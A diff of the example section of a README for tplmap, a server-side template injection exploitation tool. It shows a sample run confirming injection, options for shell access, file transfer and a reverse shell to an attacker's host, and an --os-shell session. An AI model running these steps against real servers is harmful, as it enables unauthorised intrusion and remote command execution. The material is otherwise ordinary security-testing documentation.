@@ -13,28 +13,27 @@ Example
 -------
 
 ```
-$ ./tplmap.py -u 'http://www.target.com/app?id=*' 
+$ ./tplmap.py -u 'http://www.target.com/app?id=7'
 [+] Tplmap 0.1
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
-[+] Found placeholder in GET parameter 'id'
+[+] Testing if GET parameter 'id' is injectable
 [+] Smarty plugin is testing rendering with tag '{*}'
 [+] Smarty plugin is testing blind injection
 [+] Mako plugin is testing rendering with tag '${*}'
 ...
-[+] Freemarker plugin is testing blind injection
-[+] Velocity plugin is testing rendering with tag '#set($c=*)\n${c}\n'
 [+] Jade plugin is testing rendering with tag '\n= *\n'
 [+] Jade plugin has confirmed injection with tag '\n= *\n'
 [+] Tplmap identified the following injection point:
 
+  GET parameter: id
   Engine: Jade
   Injection: \n= *\n
   Context: text
   OS: darwin
   Technique: render
   Capabilities:
-  
+
    Code evaluation: yes, javascript code
    Shell command execution: yes
    File write: yes
@@ -43,13 +42,13 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=*'
 
 [+] Rerun tplmap providing one of the following options:
 
-   --os-shell or --os-cmd to execute shell commands via the injection
-   --upload LOCAL REMOTE to upload files to the server
-   --download REMOTE LOCAL to download remote files
-   --bind-shell PORT to bind a shell on a port and connect to it
-   --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
-        
-$ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
+    --os-shell or --os-cmd to execute shell commands via the injection
+    --upload LOCAL REMOTE to upload files to the server
+    --download REMOTE LOCAL to download remote files
+    --bind-shell PORT to bind a shell on a port and connect to it
+    --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
+          
+$ ./tplmap.py -u 'http://www.target.com/app?id=7' --os-shell
 [+] Run commands on the operating system.
 
 linux $ whoami
